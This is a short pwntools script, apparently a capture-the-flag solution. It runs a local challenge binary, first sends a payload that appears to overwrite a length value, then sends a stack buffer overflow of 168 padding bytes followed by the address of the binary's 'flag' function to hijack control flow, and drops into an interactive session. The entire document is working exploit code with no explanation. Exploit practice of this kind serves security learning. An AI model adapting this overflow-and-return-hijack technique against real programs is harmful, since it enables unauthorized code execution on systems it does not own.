from pwn import *

elf = context.binary = ELF('./chall')
p = elf.process()

pl = b'A'*24 + p16(200)
p.send(pl)

payload = b'A'*168 + p64(elf.sym.flag)
p.sendline(payload)

p.interactive()
